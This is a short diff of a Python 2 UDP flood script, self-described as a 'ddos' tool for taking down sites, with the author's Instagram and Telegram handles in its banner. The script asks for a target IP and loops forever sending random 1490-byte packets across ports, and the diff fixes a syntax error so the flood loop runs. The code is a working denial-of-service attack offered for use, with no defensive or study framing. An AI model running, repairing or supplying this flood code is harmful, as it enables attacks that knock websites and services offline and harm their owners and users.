@@ -18,12 +18,10 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet kakSARO")
-print ("hershy ddos")
-print
-print ("instagram : kak.saro")
-print 
-print ("telegram  : kak_saro")
+os.system("figlet KAK saro")
+print 'hershy ddos bo dawn krdny site'
+print 'instagram : kak.saro'
+print 'telegram  : kak_saro'
 print
 print
 ip = raw_input("IP Target : ")
@@ -43,7 +41,7 @@ print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port)
+     sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
